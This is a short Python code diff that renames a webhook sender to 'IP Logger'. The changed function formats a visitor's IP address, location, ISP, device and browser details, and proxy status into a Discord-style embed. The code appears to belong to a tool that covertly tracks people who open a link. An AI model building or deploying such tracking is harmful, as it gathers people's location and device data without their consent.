@@ -134,7 +134,7 @@ def generate_random_string(length):
 def export_data(ip_info, created_at ,ip, port, os , browser, useragent, filename, token, url_thumnail, type ,id):
     info=  f"1. IP: {ip}: {port}, Time: {created_at} \n2. Khu vực: {ip_info['city']} - {ip_info['regionName']} - {ip_info['country']}\n3. Thông tin thiết bị: user_agent:{useragent} - device: {os}-{browser}\n4. Nhà cung cấp dịch vụ: {ip_info['isp']}\n5. Di động: {ip_info['mobile']}, Proxy: {ip_info['proxy']}, Hosting: {ip_info['hosting']}\n6. {type}{id}"
     embed = {
-        "username": "Thông tin truy cập IP",
+        "username": "IP Logger",
         "avatar_url": url_thumnail,
         "content": info,
         "embeds": [
